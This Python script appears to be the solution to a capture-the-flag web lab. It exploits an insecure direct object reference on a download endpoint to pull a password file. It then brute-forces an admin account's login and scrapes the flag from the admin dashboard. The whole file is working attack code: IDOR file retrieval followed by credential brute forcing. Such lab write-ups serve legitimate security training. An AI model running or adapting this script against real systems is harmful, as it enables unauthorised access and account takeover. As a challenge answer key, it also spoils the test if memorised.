#!/usr/bin/env python3
import re
import sys
import requests

BASE = "https://lwy-admin-idorlab.vercel.app"
ADMIN_EMAIL = "admin.httpyuvii@learnwithyuvi.in"


def get_password_list(session: requests.Session):
    url = f"{BASE}/api/download"
    params = {"role": "admin", "file": "password.txt"}
    r = session.get(url, params=params, timeout=15)
    r.raise_for_status()
    passwords = [x.strip() for x in r.text.splitlines() if x.strip()]
    if not passwords:
        raise RuntimeError("Password list kosong")
    return passwords


def brute_force_admin(session: requests.Session, passwords):
    url = f"{BASE}/api/admin/login"
    for i, pwd in enumerate(passwords, 1):
        r = session.post(
            url,
            json={"email": ADMIN_EMAIL, "password": pwd},
            timeout=15,
        )
        if r.status_code == 200:
            return pwd
        if i % 500 == 0:
            print(f"[+] tested {i}/{len(passwords)}")
    return None


def fetch_flag(session: requests.Session):
    url = f"{BASE}/admin/dashboard"
    r = session.get(url, timeout=15)
    r.raise_for_status()
    m = re.search(r"FLAG\{[^}]+\}", r.text)
    return m.group(0) if m else None


def main():
    session = requests.Session()

    print("[+] Downloading password list via IDOR...")
    passwords = get_password_list(session)
    print(f"[+] Got {len(passwords)} passwords")

    print("[+] Brute forcing admin login...")
    pwd = brute_force_admin(session, passwords)
    if not pwd:
        print("[-] Admin password not found")
        sys.exit(1)
    print(f"[+] Admin password found: {pwd}")

    print("[+] Fetching flag from admin dashboard...")
    flag = fetch_flag(session)
    if not flag:
        print("[-] Flag not found")
        sys.exit(1)

    print(f"<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    main()
